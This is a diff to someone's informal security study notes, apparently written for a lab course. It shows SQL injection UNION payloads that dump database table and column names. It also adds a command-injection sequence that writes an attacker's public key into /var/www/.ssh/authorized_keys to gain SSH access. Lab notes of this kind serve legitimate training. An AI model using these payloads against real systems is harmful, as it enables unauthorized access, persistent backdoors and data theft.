@@ -87,7 +87,14 @@ keep adding until it spits out an output
 Audi' Union select 1,2,3,4,5 # works, but it doesn't display 2. 2 is just filler so we can see what we want, so it will look a lot like this
 Audi' UNION select table_schema,2,table_name,column_name,5 FROM information_schema.columns #
 
-Exploit Development (The gdb stuff) 
+Exploit Development (The gdb stuff)
+
+ssh-keygen -t rsa -b 4096
+;echo "(paste publickey)" > /var/www/.ssh/authorized_keys
+;cat /var/www/.ssh/authorized_keys
+
+ssh -i id_ ( idk look in student guide
+
 https://github.com/jacksonwilkie/Security/blob/main/Exploit%20Development
 
 \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
